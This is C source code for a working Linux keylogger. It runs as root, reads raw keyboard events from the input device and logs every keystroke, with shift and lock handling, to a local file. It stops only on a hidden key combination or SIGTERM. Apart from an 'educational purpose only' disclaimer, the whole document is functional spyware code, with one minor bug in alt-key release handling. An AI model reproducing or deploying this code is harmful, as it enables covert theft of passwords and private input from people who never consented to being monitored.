/* Author: YOGESH INGALE
Desciption: Linux Keylogger written in C, able to capture all keystrokes and log them in keylogs file inside same directory.
NOTE: PLEASE USE THIS CODE FOR EDUCATIONAL PURPOSE ONLY!! */

#include<stdio.h>
#include<unistd.h>
#include<linux/input.h>
#include<stdlib.h>
#include<string.h>
#include<signal.h>
#include<time.h>
#include"input-codes-to-array.h"

int caps_status=0;
int shift_status=0;
int fin_caps=0;
FILE *fp,*wr;
char ipfile[30]="";
char buffer[30]="";
int numlock_status=0;
time_t ti;

void check_root_user()
{
	if(getuid())
	{
		printf("\nPlease run it as root\n");
		exit(1);
	}
}

void caps_status_check()
{
	FILE *caps;
	char cmd_op[5]="";
	caps=popen("((xset q 2>/dev/null | grep -iEq 'caps lock: +on') || (setleds 2>/dev/null | grep -iq 'capslock on')) && echo on","r");
	if (caps == NULL)
	{
		printf("\nError getting in caps lock status...\n");
		return;
	}
	fgets(cmd_op,4,caps);
	pclose(caps);
	caps_status = (strlen(cmd_op)==0) ? 0 : 1;
}

void numlock_status_check()
{
	FILE *numlock;
	char cmd_op[5]="";
	numlock=popen("((xset q 2>/dev/null | grep -iEq 'num lock: +on') || (setleds 2>/dev/null | grep -iq 'numlock on')) && echo on","r");
	if (numlock == NULL)
	{
		printf("\nError getting in num lock status...\n");
		return;
	}
	fgets(cmd_op,4,numlock);
	pclose(numlock);
	numlock_status = (strlen(cmd_op)==0) ? 0 : 1;
}

void catch_signal_kill(int signo)
{
	if (signo == SIGTERM)
    {
		ti = time(NULL);	
		fprintf(wr,"%s","\n\n***********************************************************************************************************************\n");
		fprintf(wr,"%s%s","                                   LOGGING STOPPED at ",ctime(&ti));
		fprintf(wr,"%s","***********************************************************************************************************************\n\n");
	    fclose(fp);
		fclose(wr);
		exit(5);
	}
}

void get_kbd_event_file()
{
	FILE *kbevtfile;
	kbevtfile=popen("readlink -f /dev/input/by-path/$(ls /dev/input/by-path/ 2>/dev/null | grep kbd)","r");	
	if (kbevtfile == NULL)
	{
		printf("\nError while getting event file...\n");
		exit(2);
	}
	fgets(ipfile,29,kbevtfile);
	ipfile[strlen(ipfile)-1] = '\0';
	pclose(kbevtfile);
	fp=fopen(ipfile,"r");
	if (fp == NULL) {printf("\nFile reading error\n"); exit(3);}
	wr=fopen("keylogs","a");
	if (wr == NULL) {printf("\nFile writing error\n"); exit(4);}
	ti = time(NULL);
	fprintf(wr,"%s","\n***********************************************************************************************************************\n");
	fprintf(wr,"%s%s","                                   LOGGING STARTED at ",ctime(&ti));
	fprintf(wr,"%s","***********************************************************************************************************************\n\n");
}

int main()
{
	struct input_event ie;
	int alt_status=0;
	int ctrl_status=0;
	check_root_user();
	caps_status_check();
	numlock_status_check();
	get_kbd_event_file();
	int flag=0;
	while (1)
	{
		fread(&ie,sizeof(ie),1,fp);
		if (ie.type == EV_KEY && ie.value == 1)
		{
			if (ie.code == 42 || ie.code == 54)
			{
				shift_status = 1;
				fin_caps = shift_status ^ caps_status;
			}
			else if (ie.code == 58)
			{
			 	caps_status = !caps_status;
				fin_caps = shift_status ^ caps_status;
			}
			else if (ie.code == 29 || ie.code == 97)
				ctrl_status = 1;
			else if (ie.code == 56 || ie.code == 100)
				alt_status = 1;
			else if (ie.code == 69)
				numlock_status = !numlock_status;
			if (ie.code >= 71 && ie.code <= 83)
			{
				if ((numlock_status ^ shift_status))
                	fprintf(wr,"%s",ip_evt_code_arr_caps[ie.code]);
				else
					fprintf(wr,"%s",ip_evt_code_arr[ie.code]);
				flag = 1;
			}	
			if (flag == 0)
			{
				if (fin_caps == 1)
				{
					if (caps_status == 1 && ((ie.code >= 16 && ie.code <=25 ) || (ie.code >= 30 && ie.code <=38) || (ie.code >=44 && ie.code <=50)))
						fprintf(wr,"%s",ip_evt_code_arr_caps[ie.code]);
					else if (caps_status == 1)
						fprintf(wr,"%s",ip_evt_code_arr[ie.code]);
					else
						fprintf(wr,"%s",ip_evt_code_arr_caps[ie.code]);
				}
				else
				{
					if ((ie.code >= 16 && ie.code <=25 ) || (ie.code >= 30 && ie.code <=38) || (ie.code >=44 && ie.code <=50) || (ie.code >= 71 && ie.code <= 83 && numlock_status ==0))
						fprintf(wr,"%s",ip_evt_code_arr[ie.code]);
					else
						fprintf(wr,"%s",ip_evt_code_arr_caps[ie.code]);
				}
			}
			//catch kill signal
			if (signal(SIGTERM,catch_signal_kill) == SIG_ERR)
				printf("\nSomething went wrong while catching the signal\n");
			if (ie.code == 1 && shift_status ==1 && ctrl_status == 1 && alt_status == 1)
			{
				ti = time(NULL);
				fprintf(wr,"%s","\n\n***********************************************************************************************************************\n");
	fprintf(wr,"%s%s","                                   LOGGING STOPPED at ",ctime(&ti));
	fprintf(wr,"%s","***********************************************************************************************************************\n\n");
				fclose(fp);
				fclose(wr);
				return 0;
			}
			flag = 0;
		}
		if (ie.value == 0 && (ie.code == 42 || ie.code == 54))
		{
			shift_status = 0;			
			fin_caps = shift_status ^ caps_status;
		}
		else if (ie.value == 0 && (ie.code == 29 || ie.code == 97))
			ctrl_status = 0;
		else if (ie.value == 0 && (ie.code == 56 || ie.code == 100))
			alt_status == 0;
	}
}
